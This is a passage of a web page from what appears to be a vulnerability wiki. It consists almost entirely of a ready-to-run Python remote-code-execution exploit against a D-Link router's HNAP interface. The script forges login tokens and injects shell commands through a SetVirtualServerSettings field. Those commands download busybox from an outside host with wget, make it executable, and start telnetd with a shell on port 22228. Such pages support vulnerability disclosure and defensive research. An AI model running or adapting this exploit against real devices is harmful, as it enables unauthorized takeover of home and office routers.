+<span class="k">def</span><span class="w"> </span><span class="nf">set_virtual_server_settings</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;set_virtual_server_settings&quot;&quot;&quot;</span>
+    <span class="n">xml_post</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="s2">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+<span class="s2">    &lt;soap:Body&gt;</span>
+<span class="s2">        &lt;SetVirtualServerSettings xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;</span>
+<span class="s2">            &lt;VirtualServerList&gt;</span>
+<span class="s2">                &lt;VirtualServerInfo&gt;</span>
+<span class="s2">                    &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
+<span class="s2">                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;</span>
+<span class="s2">                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;</span>
+<span class="s2">                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;</span>
+<span class="s2">                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;</span>
+<span class="s2">                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;</span>
+<span class="s2">                    &lt;LocalIPAddress&gt;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&lt;/LocalIPAddress&gt;</span>
+<span class="s2">                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;</span>
+<span class="s2">                &lt;/VirtualServerInfo&gt;</span>
+<span class="s2">                &lt;VirtualServerInfo:0&gt;</span>
+<span class="s2">                    &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
+<span class="s2">                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;</span>
+<span class="s2">                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;</span>
+<span class="s2">                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;</span>
+<span class="s2">                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;</span>
+<span class="s2">                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;</span>
+<span class="s2">                    &lt;LocalIPAddress&gt;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&lt;/LocalIPAddress&gt;</span>
+<span class="s2">                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;</span>
+<span class="s2">                &lt;/VirtualServerInfo:0&gt;</span>
+<span class="s2">                &lt;VirtualServerInfo:1&gt;</span>
+<span class="s2">                    &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
+<span class="s2">                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;</span>
+<span class="s2">                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;</span>
+<span class="s2">                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;</span>
+<span class="s2">                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;</span>
+<span class="s2">                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;</span>
+<span class="s2">                    &lt;LocalIPAddress&gt;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&lt;/LocalIPAddress&gt;</span>
+<span class="s2">                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;</span>
+<span class="s2">                &lt;/VirtualServerInfo:1&gt;</span>
+<span class="s2">            &lt;/VirtualServerList&gt;</span>
+<span class="s2">        &lt;/SetVirtualServerSettings&gt;</span>
+<span class="s2">    &lt;/soap:Body&gt;</span>
+<span class="s2">&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="n">ip</span><span class="p">,</span>
+        <span class="s2">&quot;X-Requested-With&quot;</span><span class="p">:</span> <span class="s2">&quot;XMLHttpRequest&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;HNAP_AUTH&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">hnap_auth</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">time_now</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;SOAPAction&quot;</span><span class="p">:</span> <span class="s1">&#39;&quot;http://purenetworks.com/HNAP1/SetVirtualServerSettings&quot;&#39;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;text/xml; charset=UTF-8&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;uid=</span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">send_http</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">xml_post</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Exploit &quot;&quot;&quot;</span>
+    <span class="n">target_ip</span> <span class="o">=</span> <span class="s2">&quot;192.168.4.1&quot;</span>
+    <span class="n">target_port</span> <span class="o">=</span> <span class="mi">443</span>
+    <span class="n">target_https</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Login_request&quot;</span><span class="p">)</span>
+    <span class="n">challenge</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">public_key</span> <span class="o">=</span> <span class="n">login_request</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">target_https</span><span class="p">)</span>
+    <span class="c1"># print(f&quot;{Challenge=}, {Cookie=}, {PublicKey=}&quot;)</span>
+    <span class="n">dummy_password</span> <span class="o">=</span> <span class="s2">&quot;Admin&quot;</span>
+    <span class="n">private_key</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">public_key</span> <span class="o">+</span> <span class="n">dummy_password</span><span class="p">,</span> <span class="n">challenge</span><span class="p">)</span>
+    <span class="n">login_password</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">challenge</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] login_password : </span><span class="si">{</span><span class="n">login_password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">soap_namespace2</span> <span class="o">=</span> <span class="s2">&quot;http://purenetworks.com/HNAP1/&quot;</span>
+    <span class="n">action</span> <span class="o">=</span> <span class="s2">&quot;Login&quot;</span>
+    <span class="n">soap_action</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&quot;</span><span class="si">{</span><span class="n">soap_namespace2</span><span class="si">}{</span><span class="n">action</span><span class="si">}</span><span class="s1">&quot;&#39;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] SOAPAction : </span><span class="si">{</span><span class="n">soap_action</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">time_now</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2000000000000</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">time_now</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Time : </span><span class="si">{</span><span class="n">time_now</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">hnap_auth</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">time_now</span> <span class="o">+</span> <span class="n">soap_action</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] HNAP_AUTH : </span><span class="si">{</span><span class="n">hnap_auth</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">login_login</span><span class="p">(</span>
+        <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">target_https</span><span class="p">,</span> <span class="n">login_password</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span>
+    <span class="p">)</span>
+    <span class="n">soap_namespace2</span> <span class="o">=</span> <span class="s2">&quot;http://purenetworks.com/HNAP1/&quot;</span>
+    <span class="n">action</span> <span class="o">=</span> <span class="s2">&quot;GetInternetConnUpTime&quot;</span>
+    <span class="n">soap_action</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&quot;</span><span class="si">{</span><span class="n">soap_namespace2</span><span class="si">}{</span><span class="n">action</span><span class="si">}</span><span class="s1">&quot;&#39;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] SOAPAction : </span><span class="si">{</span><span class="n">soap_action</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">time_now</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2000000000000</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">time_now</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Time : </span><span class="si">{</span><span class="n">time_now</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">hnap_auth</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">time_now</span> <span class="o">+</span> <span class="n">soap_action</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] HNAP_AUTH : </span><span class="si">{</span><span class="n">hnap_auth</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Checking for the vulnerability&quot;</span><span class="p">)</span>
+    <span class="n">res_text</span> <span class="o">=</span> <span class="n">get_internet_conn_up_time</span><span class="p">(</span>
+        <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">target_https</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span>
+    <span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;You need proper authorization to use this resource&quot;</span> <span class="ow">in</span> <span class="n">res_text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Target doesn&#39;t appear to be vulnerable&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Running the RCE&quot;</span><span class="p">)</span>
+    <span class="n">action</span> <span class="o">=</span> <span class="s2">&quot;SetVirtualServerSettings&quot;</span>
+    <span class="n">soap_action</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&quot;</span><span class="si">{</span><span class="n">soap_namespace2</span><span class="si">}{</span><span class="n">action</span><span class="si">}</span><span class="s1">&quot;&#39;</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">time_now</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2000000000000</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">time_now</span>
+    <span class="n">hnap_auth</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">time_now</span> <span class="o">+</span> <span class="n">soap_action</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span>
+        <span class="s2">&quot;Downloading busybox from &#39;http://192.168.0.100:8000/busybox&#39; as &quot;</span>
+        <span class="s2">&quot;the one on the device isn&#39;t good&quot;</span>
+    <span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;1;wget http://192.168.0.100:8000/busybox -O /tmp/tel;AAAAAAAAAAA&quot;</span>
+    <span class="n">set_virtual_server_settings</span><span class="p">(</span>
+        <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">target_https</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">cmd</span>
+    <span class="p">)</span>
+    <span class="n">action</span> <span class="o">=</span> <span class="s2">&quot;SetVirtualServerSettings&quot;</span>
+    <span class="n">soap_action</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&quot;</span><span class="si">{</span><span class="n">soap_namespace2</span><span class="si">}{</span><span class="n">action</span><span class="si">}</span><span class="s1">&quot;&#39;</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">time_now</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2000000000000</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">time_now</span>
+    <span class="n">hnap_auth</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">time_now</span> <span class="o">+</span> <span class="n">soap_action</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Renaming busybox to /tmp/telnetd&quot;</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;1;chmod +x /tmp/tel;mv /tmp/tel /tmp/telnetd;AAAAAAAAAAAAAAAAAAAA&quot;</span>
+    <span class="n">set_virtual_server_settings</span><span class="p">(</span>
+        <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">target_https</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">cmd</span>
+    <span class="p">)</span>
+    <span class="n">action</span> <span class="o">=</span> <span class="s2">&quot;SetVirtualServerSettings&quot;</span>
+    <span class="n">soap_action</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&quot;</span><span class="si">{</span><span class="n">soap_namespace2</span><span class="si">}{</span><span class="n">action</span><span class="si">}</span><span class="s1">&quot;&#39;</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">time_now</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2000000000000</span>
+    <span class="n">time_now</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">time_now</span>
+    <span class="n">hnap_auth</span> <span class="o">=</span> <span class="n">get_hmac_key_md5</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">time_now</span> <span class="o">+</span> <span class="n">soap_action</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Launching telnetd on port 22228&quot;</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;1;/tmp/telnetd -p 22228 -l sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
+    <span class="n">set_virtual_server_settings</span><span class="p">(</span>
+        <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">target_https</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">cmd</span>
+    <span class="p">)</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">exploit</span><span class="p">()</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../D-LINK-Go-RT-AC750%20GORTAC750_A1_FW_v101b03%E5%AD%98%E5%9C%A8%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%28CVE-2024-22853%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../D-LINK-Go-RT-AC750%20GORTAC750_A1_FW_v101b03%E5%AD%98%E5%9C%A8%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%28CVE-2024-22853%29/" class="btn btn-xs btn-link">
+        D LINK Go RT AC750 GORTAC750 A1 FW v101b03存在硬编码漏洞(CVE 2024 22853)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../D-LINK-DIR-845L%E6%8E%A5%E5%8F%A3bsc_sms_inbox.php%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../D-LINK-DIR-845L%E6%8E%A5%E5%8F%A3bsc_sms_inbox.php%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        D LINK DIR 845L接口bsc sms inbox.php存在信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
